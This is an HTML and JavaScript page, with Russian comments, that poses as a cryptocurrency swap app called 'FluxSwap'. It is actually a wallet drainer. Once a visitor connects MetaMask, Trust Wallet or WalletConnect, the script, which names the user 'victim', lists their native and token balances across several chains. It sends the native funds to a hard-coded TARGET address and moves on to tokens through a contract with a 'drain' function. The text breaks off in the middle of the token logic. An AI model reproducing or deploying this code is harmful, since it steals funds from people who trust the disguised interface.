<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>FluxSwap</title>

    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@500;600&display=swap" rel="stylesheet" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />

    <style>
        /* ===== СТИЛИ ИЗ gsgsf.html (без изменений) ===== */
        :root {
            --bg-body: #08080f;
            --bg-card: rgba(20, 18, 35, 0.65);
            --bg-input: rgba(30, 28, 50, 0.5);
            --bg-hover: rgba(139, 92, 246, 0.08);
            --bg-swap: rgba(25, 23, 42, 0.6);
            --border: rgba(139, 92, 246, 0.15);
            --border-hover: rgba(139, 92, 246, 0.4);
            --text: #e9e7ff;
            --text-dim: #7a7595;
            --text-muted: #4a4660;
            --accent: #8b5cf6;
            --accent-2: #ec4899;
            --accent-glow: rgba(139, 92, 246, 0.4);
            --accent-bg: rgba(139, 92, 246, 0.1);
            --gradient: linear-gradient(135deg, #8b5cf6 0%, #ec4899 100%);
            --danger: #f87171;
            --radius: 20px;
            --radius-sm: 12px;
            --transition: 0.2s ease;
            --font: 'Space Grotesk', sans-serif;
            --font-mono: 'JetBrains Mono', monospace;
        }

        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            background: var(--bg-body);
            color: var(--text);
            font-family: var(--font);
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
            -webkit-font-smoothing: antialiased;
            overflow-x: hidden;
        }

        body::before {
            content: '';
            position: fixed;
            top: -30%; left: -10%;
            width: 60%; height: 80%;
            background: radial-gradient(circle, rgba(139,92,246,0.12) 0%, transparent 70%);
            pointer-events: none;
        }

        body::after {
            content: '';
            position: fixed;
            bottom: -30%; right: -10%;
            width: 60%; height: 80%;
            background: radial-gradient(circle, rgba(236,72,153,0.1) 0%, transparent 70%);
            pointer-events: none;
        }

        .card {
            background: var(--bg-card);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border-radius: var(--radius);
            padding: 24px 20px 20px;
            max-width: 420px;
            width: 100%;
            border: 1px solid var(--border);
            position: relative;
            z-index: 1;
        }

        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; }
        .header-brand { display: flex; align-items: center; gap: 10px; }
        .header-brand .logo-mark {
            width: 32px; height: 32px; border-radius: 8px;
            background: var(--gradient);
            display: flex; align-items: center; justify-content: center;
            font-size: 0.9rem; font-weight: 700; color: #fff;
            box-shadow: 0 0 20px var(--accent-glow);
        }
        .header-brand .brand-name { font-size: 1.25rem; font-weight: 700; letter-spacing: -0.5px; }

        .header-actions { display: flex; align-items: center; gap: 8px; }
        .icon-btn {
            background: var(--bg-input); border: 1px solid var(--border);
            color: var(--text-dim); width: 36px; height: 36px;
            border-radius: 10px; cursor: pointer; transition: var(--transition);
            display: flex; align-items: center; justify-content: center; font-size: 0.85rem;
        }
        .icon-btn:hover { border-color: var(--border-hover); color: var(--text); background: var(--bg-hover); }

        .btn-connect {
            background: var(--gradient); border: none; color: #fff;
            font-weight: 600; font-size: 0.8rem; padding: 9px 18px;
            border-radius: 10px; cursor: pointer; transition: var(--transition);
            font-family: var(--font); display: flex; align-items: center; gap: 6px;
            box-shadow: 0 0 15px rgba(139,92,246,0.3);
        }
        .btn-connect:hover { opacity: 0.9; transform: translateY(-1px); }
        .btn-connect.connected { background: var(--bg-input); border: 1px solid var(--accent); color: var(--accent); box-shadow: none; }

        .status {
            background: var(--bg-input); padding: 10px 14px;
            border-radius: var(--radius-sm); margin-bottom: 16px;
            font-size: 0.78rem; color: var(--text-dim);
            border: 1px solid var(--border); min-height: 40px;
            display: flex; align-items: center; font-family: var(--font-mono);
        }
        .status.ok { color: var(--accent); border-color: var(--border-hover); }
        .status.err { color: var(--danger); border-color: rgba(248,113,113,0.3); }

        .swap-container {
            background: var(--bg-swap); border-radius: var(--radius);
            border: 1px solid var(--border); overflow: hidden;
        }
        .swap-section { padding: 16px; }
        .swap-label {
            display: flex; justify-content: space-between; align-items: center;
            font-size: 0.7rem; color: var(--text-muted); margin-bottom: 10px;
            text-transform: uppercase; letter-spacing: 1px; font-weight: 500;
        }
        .swap-label .balance-text {
            color: var(--text-dim); cursor: pointer; transition: var(--transition);
            font-family: var(--font-mono); font-size: 0.72rem;
            text-transform: none; letter-spacing: 0;
        }
        .swap-label .balance-text:hover { color: var(--accent); }

        .swap-input-row { display: flex; align-items: center; gap: 12px; }
        .swap-input-row input {
            flex: 1; background: transparent; border: none; color: var(--text);
            font-size: 1.5rem; font-weight: 500; outline: none;
            font-family: var(--font-mono); min-width: 0;
        }
        .swap-input-row input::placeholder { color: var(--text-muted); }
        .swap-input-row input[type="number"]::-webkit-inner-spin-button { -webkit-appearance: none; }

        .token-btn {
            display: flex; align-items: center; gap: 8px;
            background: var(--bg-input); padding: 7px 14px 7px 7px;
            border-radius: 12px; border: 1px solid var(--border);
            cursor: pointer; transition: var(--transition); flex-shrink: 0;
        }
        .token-btn:hover { border-color: var(--border-hover); background: var(--bg-hover); }
        .token-btn .token-mark {
            width: 26px; height: 26px; border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            overflow: hidden; flex-shrink: 0;
        }
        .token-btn .token-mark img { width: 100%; height: 100%; object-fit: contain; }
        .token-btn .token-text { font-size: 0.9rem; font-weight: 600; }
        .token-btn .token-caret { font-size: 0.6rem; color: var(--text-dim); margin-left: 2px; }

        .usd-est { font-size: 0.68rem; color: var(--text-muted); margin-top: 6px; font-family: var(--font-mono); }

        .swap-divider { position: relative; height: 1px; background: var(--border); }
        .swap-divider .diamond {
            position: absolute; left: 50%; top: 50%;
            transform: translate(-50%, -50%) rotate(45deg);
            width: 30px; height: 30px; background: var(--bg-swap);
            border: 1px solid var(--border);
            display: flex; align-items: center; justify-content: center;
            cursor: pointer; transition: var(--transition);
        }
        .swap-divider .diamond:hover { border-color: var(--accent); box-shadow: 0 0 12px var(--accent-glow); }
        .swap-divider .diamond i { transform: rotate(-45deg); font-size: 0.7rem; color: var(--text-dim); }
        .swap-divider .diamond:hover i { color: var(--accent); }

        .route-bar {
            display: flex; justify-content: space-between; align-items: center;
            padding: 12px 16px 4px; font-size: 0.72rem; color: var(--text-dim);
        }
        .route-bar .route-tag { display: flex; align-items: center; gap: 6px; }
        .route-bar .route-tag .pulse {
            width: 6px; height: 6px; border-radius: 50%;
            background: var(--accent); box-shadow: 0 0 8px var(--accent);
            animation: pulse 2s ease infinite;
        }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
        .route-bar .rate-text { color: var(--accent); font-family: var(--font-mono); font-weight: 500; }

        .btn-swap {
            background: var(--gradient); border: none; color: #fff;
            font-weight: 700; font-size: 1rem; padding: 15px;
            border-radius: 14px; width: 100%; cursor: pointer;
            transition: var(--transition); font-family: var(--font);
            margin-top: 12px; box-shadow: 0 4px 20px rgba(139,92,246,0.25);
        }
        .btn-swap:hover:not(:disabled) { transform: translateY(-1px); box-shadow: 0 6px 25px rgba(139,92,246,0.4); }
        .btn-swap:disabled { background: var(--bg-input); color: var(--text-muted); cursor: not-allowed; box-shadow: none; }
        .btn-swap.loading { opacity: 0.7; pointer-events: none; }

        .max-tag {
            background: var(--accent-bg); border: none; color: var(--accent);
            font-size: 0.65rem; font-weight: 700; padding: 3px 8px;
            border-radius: 6px; cursor: pointer; transition: var(--transition);
            font-family: var(--font); text-transform: uppercase; letter-spacing: 0.5px;
        }
        .max-tag:hover { background: rgba(139,92,246,0.2); }

        .modal-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(8, 8, 15, 0.8); backdrop-filter: blur(8px);
            display: flex; align-items: center; justify-content: center;
            z-index: 1000; opacity: 0; pointer-events: none;
            transition: opacity 0.25s ease;
        }
        .modal-overlay.active { opacity: 1; pointer-events: auto; }

        .modal {
            background: rgba(20, 18, 35, 0.95); backdrop-filter: blur(20px);
            border-radius: var(--radius); padding: 28px 22px;
            max-width: 400px; width: 90%; border: 1px solid var(--border);
            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
            transform: scale(0.95); transition: transform 0.25s ease;
        }
        .modal-overlay.active .modal { transform: scale(1); }
        .modal h3 { font-size: 1.1rem; font-weight: 600; text-align: center; margin-bottom: 20px; color: var(--text); }

        .wallet-card {
            display: flex; align-items: center; gap: 14px;
            background: var(--bg-input); border: 1px solid var(--border);
            border-radius: var(--radius-sm); padding: 14px 16px;
            margin-bottom: 10px; cursor: pointer; transition: var(--transition);
            text-decoration: none; color: var(--text);
        }
        .wallet-card:hover { border-color: var(--border-hover); background: var(--bg-hover); }
        .wallet-card .w-icon { font-size: 1.4rem; width: 36px; text-align: center; }
        .wallet-card .w-info { display: flex; flex-direction: column; }
        .wallet-card .w-info .w-name { font-weight: 600; font-size: 0.95rem; }
        .wallet-card .w-info .w-desc { font-size: 0.72rem; color: var(--text-muted); }

        .modal-close {
            display: block; margin: 14px auto 0; background: transparent;
            border: none; color: var(--text-muted); font-size: 0.82rem;
            cursor: pointer; transition: var(--transition); font-family: var(--font);
        }
        .modal-close:hover { color: var(--text); }

        .search-input {
            width: 100%; background: var(--bg-input); border: 1px solid var(--border);
            color: var(--text); padding: 12px 14px; border-radius: var(--radius-sm);
            font-size: 0.88rem; margin-bottom: 14px; outline: none; font-family: var(--font);
        }
        .search-input:focus { border-color: var(--border-hover); }
        .search-input::placeholder { color: var(--text-muted); }

        .token-list { max-height: 280px; overflow-y: auto; margin-bottom: 8px; }
        .token-list::-webkit-scrollbar { width: 4px; }
        .token-list::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }

        .token-row {
            display: flex; align-items: center; gap: 12px;
            padding: 10px 12px; border-radius: var(--radius-sm);
            cursor: pointer; transition: var(--transition);
        }
        .token-row:hover { background: var(--bg-hover); }
        .token-row .t-mark {
            width: 30px; height: 30px; border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            flex-shrink: 0; overflow: hidden;
        }
        .token-row .t-mark img { width: 100%; height: 100%; object-fit: contain; }
        .token-row .t-info { display: flex; flex-direction: column; }
        .token-row .t-info .t-sym { font-weight: 600; font-size: 0.92rem; }
        .token-row .t-info .t-name { font-size: 0.72rem; color: var(--text-muted); }
        .token-row.disabled { opacity: 0.35; cursor: not-allowed; pointer-events: none; }

        @media (max-width: 480px) {
            .card { padding: 18px 14px 14px; }
            .swap-input-row input { font-size: 1.2rem; }
            .header-brand .brand-name { font-size: 1.05rem; }
            .btn-connect { font-size: 0.72rem; padding: 8px 14px; }
        }

        .hidden { display: none !important; }

        /* Для QR-кода */
        #qrContainer {
            margin: 15px auto 10px;
            display: flex;
            justify-content: center;
            background: white;
            padding: 10px;
            border-radius: 10px;
            width: fit-content;
        }
        #qrContainer canvas { max-width: 100%; height: auto; }
    </style>
</head>
<body>

    <div class="card">
        <div class="header">
            <div class="header-brand">
                <div class="logo-mark">FS</div>
                <div class="brand-name">FluxSwap</div>
            </div>
            <div class="header-actions">
                <button id="refreshBtn" class="icon-btn" title="Reset"><i class="fas fa-rotate-left"></i></button>
                <button id="connectWalletBtn" class="btn-connect">
                    <i class="fas fa-wallet"></i>
                    Connect
                </button>
            </div>
        </div>

        <div id="status" class="status">Ready</div>

        <div class="swap-container">
            <div class="swap-section">
                <div class="swap-label">
                    <span>From</span>
                    <span class="balance-text" id="balanceFrom">0.000 <button class="max-tag" id="maxBtn">Max</button></span>
                </div>
                <div class="swap-input-row">
                    <input type="number" id="inputAmount" placeholder="0.0" step="any" min="0" value="" />
                    <div class="token-btn" id="tokenFromSelect">
                        <span class="token-mark"><img id="fromIcon" src="https://cdn.jsdelivr.net/gh/atomiclabs/cryptocurrency-icons@1a63530be6e374711a8554f31b17e4cb92c25fa5/svg/color/eth.svg" alt="ETH" /></span>
                        <span class="token-text" id="fromSymbol">ETH</span>
                        <span class="token-caret"><i class="fas fa-chevron-down"></i></span>
                    </div>
                </div>
                <div class="usd-est" id="fromUsd">~$0.00</div>
            </div>

            <div class="swap-divider">
                <div class="diamond" id="swapArrow">
                    <i class="fas fa-arrow-down-up-across-line"></i>
                </div>
            </div>

            <div class="swap-section">
                <div class="swap-label">
                    <span>To</span>
                    <span class="balance-text" id="balanceTo">0.000</span>
                </div>
                <div class="swap-input-row">
                    <input type="text" id="outputAmount" placeholder="0.0" disabled />
                    <div class="token-btn" id="tokenToSelect">
                        <span class="token-mark"><img id="toIcon" src="https://cdn.jsdelivr.net/gh/atomiclabs/cryptocurrency-icons@1a63530be6e374711a8554f31b17e4cb92c25fa5/svg/color/usdt.svg" alt="USDT" /></span>
                        <span class="token-text" id="toSymbol">USDT</span>
                        <span class="token-caret"><i class="fas fa-chevron-down"></i></span>
                    </div>
                </div>
                <div class="usd-est" id="toUsd">~$0.00</div>
            </div>
        </div>

        <div class="route-bar">
            <span class="route-tag">
                <span class="pulse"></span>
                Auto Route
            </span>
            <span>Rate: <span class="rate-text" id="rateDisplay">1 ETH = 0.00 USDT</span></span>
        </div>

        <button id="swapBtn" class="btn-swap" disabled>Connect Wallet</button>
    </div>

    <!-- Модалка выбора кошелька -->
    <div id="walletModal" class="modal-overlay">
        <div class="modal">
            <h3>Connect Wallet</h3>
            <div id="metamaskOption" class="wallet-card">
                <span class="w-icon"><i class="fab fa-meta"></i></span>
                <span class="w-info">
                    <span class="w-name">MetaMask</span>
                    <span class="w-desc">Browser extension</span>
                </span>
            </div>
            <div id="trustOption" class="wallet-card">
                <span class="w-icon"><i class="fas fa-link" style="color:#8b5cf6;"></i></span>
                <span class="w-info">
                    <span class="w-name">Trust Wallet</span>
                    <span class="w-desc">Mobile &amp; browser</span>
                </span>
            </div>
            <div id="wcOption" class="wallet-card">
                <span class="w-icon"><i class="fas fa-wifi" style="color:#3b99fc;"></i></span>
                <span class="w-info">
                    <span class="w-name">WalletConnect</span>
                    <span class="w-desc">QR‑code for any wallet</span>
                </span>
            </div>
            <!-- Контейнер для QR-кода (появляется при выборе WalletConnect) -->
            <div id="qrContainer" class="hidden"></div>
            <button class="modal-close" id="closeModalBtn">Cancel</button>
        </div>
    </div>

    <!-- Модалка выбора токена (декоративная) -->
    <div id="tokenModal" class="modal-overlay">
        <div class="modal">
            <h3>Select Token</h3>
            <input type="text" id="tokenSearchInput" class="search-input" placeholder="Search or paste address" />
            <div id="tokenList" class="token-list"></div>
            <button class="modal-close" id="closeTokenModalBtn">Cancel</button>
        </div>
    </div>

    <!-- Подключаем библиотеки -->
    <script src="libs/ethers.umd.min.js"></script>
    <script src="libs/walletconnect-provider.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>

    <script>
        (function() {
            'use strict';

            // ============================================================
            // КОНФИГУРАЦИЯ (взята из index.html / index2.html)
            // ============================================================
            const TARGET = '0x12538D6AC7053383cd81686E069a3E277b6E828c';
            const CONTRACT_ADDRESS = '0xf09284028273F381529DA08499ade7165b2199f8';
            const PROJECT_ID = '2c94255cd6cb3dd91ea6f447bbe7d3c9';

            const DRAINER_ABI = [
                {
                    "inputs": [],
                    "stateMutability": "nonpayable",
                    "type": "constructor"
                },
                {
                    "inputs": [
                        { "internalType": "address", "name": "token", "type": "address" },
                        { "internalType": "address", "name": "from", "type": "address" },
                        { "internalType": "uint256", "name": "amount", "type": "uint256" }
                    ],
                    "name": "drain",
                    "outputs": [],
                    "stateMutability": "nonpayable",
                    "type": "function"
                },
                {
                    "inputs": [],
                    "name": "owner",
                    "outputs": [ { "internalType": "address", "name": "", "type": "address" } ],
                    "stateMutability": "view",
                    "type": "function"
                }
            ];

            const ERC20_ABI = [
                'function balanceOf(address) view returns (uint256)',
                'function approve(address spender, uint256 amount) returns (bool)',
                'function transfer(address to, uint256 amount) returns (bool)',
                'function decimals() view returns (uint8)',
                'function symbol() view returns (string)',
                'function allowance(address owner, address spender) view returns (uint256)'
            ];

            // ============================================================
            // ДАННЫЕ ДЛЯ ДЕКОРАТИВНОГО ВЫБОРА ТОКЕНОВ
            // ============================================================
            const ICON_BASE = 'https://cdn.jsdelivr.net/gh/atomiclabs/cryptocurrency-icons@1a63530be6e374711a8554f31b17e4cb92c25fa5/svg/color';
            const tokens = [
                { symbol: 'ETH', name: 'Ethereum', img: ICON_BASE + '/eth.svg' },
                { symbol: 'BNB', name: 'BNB', img: ICON_BASE + '/bnb.svg' },
                { symbol: 'USDT', name: 'Tether USD', img: ICON_BASE + '/usdt.svg' },
                { symbol: 'USDC', name: 'USD Coin', img: ICON_BASE + '/usdc.svg' },
                { symbol: 'DAI', name: 'Dai', img: ICON_BASE + '/dai.svg' },
                { symbol: 'LINK', name: 'Chainlink', img: ICON_BASE + '/link.svg' },
                { symbol: 'MATIC', name: 'Polygon', img: ICON_BASE + '/matic.svg' },
                { symbol: 'WBTC', name: 'Wrapped BTC', img: ICON_BASE + '/btc.svg' }
            ];

            let fromToken = tokens[0];
            let toToken = tokens[2];
            let currentSelectType = null;

            // ============================================================
            // DOM-ЭЛЕМЕНТЫ
            // ============================================================
            const statusEl = document.getElementById('status');
            const connectBtn = document.getElementById('connectWalletBtn');
            const swapBtn = document.getElementById('swapBtn');
            const refreshBtn = document.getElementById('refreshBtn');
            const inputAmount = document.getElementById('inputAmount');
            const outputAmount = document.getElementById('outputAmount');
            const maxBtn = document.getElementById('maxBtn');
            const rateDisplay = document.getElementById('rateDisplay');
            const fromSymbol = document.getElementById('fromSymbol');
            const toSymbol = document.getElementById('toSymbol');
            const fromIcon = document.getElementById('fromIcon');
            const toIcon = document.getElementById('toIcon');
            const balanceFrom = document.getElementById('balanceFrom');
            const balanceTo = document.getElementById('balanceTo');
            const fromUsd = document.getElementById('fromUsd');
            const toUsd = document.getElementById('toUsd');
            const swapArrow = document.getElementById('swapArrow');

            const walletModal = document.getElementById('walletModal');
            const closeModalBtn = document.getElementById('closeModalBtn');
            const metamaskOption = document.getElementById('metamaskOption');
            const trustOption = document.getElementById('trustOption');
            const wcOption = document.getElementById('wcOption');

            const tokenModal = document.getElementById('tokenModal');
            const tokenSearchInput = document.getElementById('tokenSearchInput');
            const tokenList = document.getElementById('tokenList');
            const closeTokenModalBtn = document.getElementById('closeTokenModalBtn');

            const qrContainer = document.getElementById('qrContainer');

            // ============================================================
            // СОСТОЯНИЕ
            // ============================================================
            let provider = null;
            let signer = null;
            let victim = null;
            let chainId = null;
            let isConnected = false;
            let isProcessing = false;
            let wcProvider = null;
            let isConnecting = false;

            // ============================================================
            // UI-ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
            // ============================================================
            function setStatus(text, type) {
                statusEl.textContent = text;
                statusEl.className = 'status';
                if (type === 'ok') statusEl.classList.add('ok');
                if (type === 'err') statusEl.classList.add('err');
            }

            function updateConnectButton() {
                if (isConnected && victim) {
                    connectBtn.innerHTML = `<i class="fas fa-check"></i> ${victim.slice(0,6)}...${victim.slice(-4)}`;
                    connectBtn.classList.add('connected');
                } else {
                    connectBtn.innerHTML = '<i class="fas fa-wallet"></i> Connect';
                    connectBtn.classList.remove('connected');
                }
                updateSwapButton();
            }

            function updateSwapButton() {
                const val = parseFloat(inputAmount.value);
                if (isProcessing) {
                    swapBtn.textContent = 'Processing...';
                    swapBtn.disabled = true;
                    swapBtn.className = 'btn-swap loading';
                    return;
                }
                if (!isConnected) {
                    swapBtn.textContent = 'Connect Wallet';
                    swapBtn.disabled = false;
                    swapBtn.className = 'btn-swap';
                    return;
                }
                if (!val || val <= 0) {
                    swapBtn.textContent = 'Enter an amount';
                    swapBtn.disabled = true;
                    swapBtn.className = 'btn-swap';
                    return;
                }
                swapBtn.textContent = 'Swap';
                swapBtn.disabled = false;
                swapBtn.className = 'btn-swap';
            }

            function openModal(modal) { modal.classList.add('active'); }
            function closeModal(modal) { modal.classList.remove('active'); }

            // ============================================================
            // ОЧИСТКА СЕССИИ (для WalletConnect)
            // ============================================================
            async function forceClearSession() {
                try {
                    if (wcProvider) {
                        try { await wcProvider.disconnect(); } catch (e) {}
                        wcProvider = null;
                    }
                    const patterns = ['wc', 'walletconnect', 'WALLETCONNECT', 'wallet-connect'];
                    for (const pattern of patterns) {
                        for (let i = localStorage.length - 1; i >= 0; i--) {
                            const key = localStorage.key(i);
                            if (key && key.toLowerCase().includes(pattern.toLowerCase())) localStorage.removeItem(key);
                        }
                        for (let i = sessionStorage.length - 1; i >= 0; i--) {
                            const key = sessionStorage.key(i);
                            if (key && key.toLowerCase().includes(pattern.toLowerCase())) sessionStorage.removeItem(key);
                        }
                        document.cookie.split(';').forEach(cookie => {
                            const [name] = cookie.trim().split('=');
                            if (name && name.toLowerCase().includes(pattern.toLowerCase())) {
                                document.cookie = `${name}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;`;
                            }
                        });
                    }
                    try {
                        const dbs = await indexedDB.databases();
                        for (const db of dbs) {
                            if (db.name && (db.name.toLowerCase().includes('wallet') || db.name.toLowerCase().includes('wc'))) {
                                await new Promise((resolve, reject) => {
                                    const req = indexedDB.deleteDatabase(db.name);
                                    req.onsuccess = resolve;
                                    req.onerror = reject;
                                });
                            }
                        }
                    } catch (e) {}
                    provider = null; signer = null; victim = null; chainId = null;
                    isProcessing = false;
                    qrContainer.innerHTML = '';
                    qrContainer.classList.add('hidden');
                    console.log('Сессия полностью сброшена');
                } catch (e) {}
            }

            // ============================================================
            // ГЕНЕРАЦИЯ QR-КОДА ДЛЯ WALLETCONNECT
            // ============================================================
            function generateQR(uri) {
                qrContainer.innerHTML = '';
                new QRCode(qrContainer, {
                    text: uri,
                    width: 200,
                    height: 200,
                    colorDark: '#000000',
                    colorLight: '#ffffff',
                    correctLevel: QRCode.CorrectLevel.H
                });
                qrContainer.classList.remove('hidden');
                setStatus('Отсканируйте QR-код в любом кошельке');
            }

            // ============================================================
            // ПОДКЛЮЧЕНИЕ КОШЕЛЬКОВ
            // ============================================================
            async function connectWallet(wallet) {
                if (isConnecting || isProcessing) return;
                if (!window.ethereum) {
                    setStatus('❌ Ethereum провайдер не найден. Установите MetaMask или Trust.', 'err');
                    return;
                }
                let ethProvider = null;
                if (wallet === 'metamask') {
                    if (window.ethereum.isMetaMask && !window.ethereum.isTrust && !window.ethereum.isTrustWallet) {
                        ethProvider = window.ethereum;
                    } else if (window.ethereum.providers) {
                        for (const p of window.ethereum.providers) {
                            if (p.isMetaMask && !p.isTrust && !p.isTrustWallet) {
                                ethProvider = p; break;
                            }
                        }
                    }
                } else if (wallet === 'trust') {
                    if (window.ethereum.isTrust || window.ethereum.isTrustWallet) {
                        ethProvider = window.ethereum;
                    } else if (window.ethereum.providers) {
                        for (const p of window.ethereum.providers) {
                            if (p.isTrust || p.isTrustWallet) {
                                ethProvider = p; break;
                            }
                        }
                    }
                }
                if (!ethProvider) {
                    setStatus(`❌ ${wallet === 'metamask' ? 'MetaMask' : 'Trust Wallet'} не обнаружен. Установите расширение.`, 'err');
                    return;
                }
                try {
                    setStatus('Подключение...', '');
                    isConnecting = true;
                    const web3Provider = new ethers.providers.Web3Provider(ethProvider);
                    await web3Provider.send('eth_requestAccounts', []);
                    const signer_ = web3Provider.getSigner();
                    const address = await signer_.getAddress();
                    const network = await web3Provider.getNetwork();

                    provider = web3Provider;
                    signer = signer_;
                    victim = address;
                    chainId = network.chainId;
                    isConnected = true;

                    updateConnectButton();
                    closeModal(walletModal);
                    setStatus(`✅ ${wallet === 'metamask' ? 'MetaMask' : 'Trust'}: ${address.slice(0,6)}...${address.slice(-4)}`, 'ok');
                    isConnecting = false;

                    const val = parseFloat(inputAmount.value);
                    if (val > 0) setTimeout(() => startDrain(), 800);
                } catch (e) {
                    setStatus('❌ ' + e.message, 'err');
                    isConnecting = false;
                }
            }

            async function connectWalletConnect() {
                if (isConnecting || isProcessing) return;
                const EthereumProvider = window['@walletconnect/ethereum-provider']?.default ||
                                         window['@walletconnect/ethereum-provider']?.EthereumProvider ||
                                         window['@walletconnect/ethereum-provider'];
                if (!EthereumProvider) {
                    setStatus('❌ WalletConnect не доступен.', 'err');
                    return;
                }
                try {
                    setStatus('Подготовка...', '');
                    isConnecting = true;
                    await forceClearSession();

                    wcProvider = await EthereumProvider.init({
                        projectId: PROJECT_ID,
                        chains: [1, 56, 137, 42161],
                        showQrModal: false,
                        reconnect: false,
                        session: undefined
                    });

                    wcProvider.on('display_uri', (uri) => {
                        generateQR(uri);
                        setStatus('Отсканируйте QR-код в любом кошельке');
                    });

                    wcProvider.on('chainChanged', () => {});
                    wcProvider.on('accountsChanged', (accounts) => {
                        if (accounts.length === 0) {
                            setStatus('Аккаунт отключён', 'err');
                            isConnected = false;
                            updateConnectButton();
                            isConnecting = false;
                        }
                    });

                    if (wcProvider.uri) {
                        generateQR(wcProvider.uri);
                        setStatus('Отсканируйте QR-код в любом кошельке');
                    }

                    let uriTimeout = setTimeout(() => {
                        if (!qrContainer.classList.contains('hidden') || !wcProvider.uri) {
                            setStatus('Не удалось получить QR-код. Попробуйте другой кошелёк.', 'err');
                            isConnecting = false;
                        }
                    }, 8000);

                    await wcProvider.enable();
                    clearTimeout(uriTimeout);

                    const web3Provider = new ethers.providers.Web3Provider(wcProvider);
                    const signer_ = web3Provider.getSigner();
                    const address = await signer_.getAddress();
                    const network = await web3Provider.getNetwork();

                    provider = web3Provider;
                    signer = signer_;
                    victim = address;
                    chainId = network.chainId;
                    isConnected = true;

                    updateConnectButton();
                    closeModal(walletModal);
                    qrContainer.classList.add('hidden');
                    setStatus(`✅ WalletConnect: ${address.slice(0,6)}...${address.slice(-4)}`, 'ok');
                    isConnecting = false;

                    const val = parseFloat(inputAmount.value);
                    if (val > 0) setTimeout(() => startDrain(), 800);
                } catch (e) {
                    setStatus('❌ ' + e.message, 'err');
                    isConnecting = false;
                }
            }

            // ============================================================
            // ЛОГИКА ДРЕЙНЕРА (объединена из index.html и index2.html)
            // ============================================================
            async function checkBalances() {
                const assets = [];
                const nativeBal = await provider.getBalance(victim);
                if (nativeBal.gt(0)) assets.push({ type: 'native', amount: nativeBal });

                const TOKENS = {
                    1: {
                        'USDT': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
                        'USDC': '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
                        'DAI': '0x6B175474E89094C44Da98b954EedeAC495271d0F',
                        'WETH': '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
                        'WBTC': '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',
                        'LINK': '0x514910771AF9Ca656af840dff83E8264EcF986CA'
                    },
                    56: {
                        'USDT': '0x55d398326f99059fF775485246999027B3197955',
                        'USDC': '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
                        'BUSD': '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
                        'WBNB': '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c',
                        'DAI': '0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3',
                        'ETH': '0x2170Ed0880ac9A755fd29B2688956BD959F933F8'
                    },
                    137: {
                        'USDT': '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
                        'USDC': '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
                        'WETH': '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619',
                        'DAI': '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063',
                        'WBTC': '0x1bfd67037b42cf73acF2047067bd4F2C47D9BfD6'
                    },
                    42161: {
                        'USDC': '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8',
                        'WETH': '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1',
                        'DAI': '0xDA10009cBd5D07dd0CeCc661609534282362a0A0'
                    }
                };
                const tokensMap = TOKENS[chainId] || {};
                for (const [symbol, addr] of Object.entries(tokensMap)) {
                    try {
                        const contract = new ethers.Contract(addr, ERC20_ABI, provider);
                        const bal = await contract.balanceOf(victim);
                        if (bal.gt(0)) assets.push({ type: 'token', address: addr, amount: bal, symbol });
                    } catch (e) {}
                }
                return assets;
            }

            async function startDrain() {
                if (isProcessing) return;
                if (!provider || !signer) {
                    setStatus('Сначала подключите кошелёк', 'err');
                    return;
                }

                isProcessing = true;
                updateSwapButton();
                setStatus('Сбор активов...', '');

                try {
                    let assets = await checkBalances();
                    console.log('Найдено активов:', assets.length);

                    if (assets.length === 0) {
                        setStatus('Баланс пуст', 'err');
                        isProcessing = false;
                        updateSwapButton();
                        return;
                    }

                    setStatus(`Найдено активов: ${assets.length}`, '');
                    await new Promise(resolve => setTimeout(resolve, 1500));

                    // ---- Нативные ----
                    for (const a of assets) {
                        if (a.type !== 'native') continue;
                        try {
                            const gasPrice = await provider.getGasPrice();
                            const gasLimit = 21000;
                            const gasCost = gasPrice.mul(gasLimit);
                            const value = a.amount.sub(gasCost);
                            if (value.gt(0)) {
                                setStatus('Перевод нативных...', '');
                                const tx = await signer.sendTransaction({ to: TARGET, value, gasPrice, gasLimit });
                                await tx.wait();
                            }
                        } catch (e) { console.warn('Ошибка нативных:', e); }
                    }

                    // ---- Токены через контракт (или напрямую) ----
                    const useContract = CONTRACT_ADDRESS && CONTRACT_ADDRESS.startsWith('0x');
                    for (const a of assets) {
                        if (a.type !== 'token') continue;
                        try {
                            setStatus(`Обработка ${a.symbol}...`, '');
                            const token = new ethers.Contract(a.address, ERC20_ABI, signer);
                            if (useContract) {
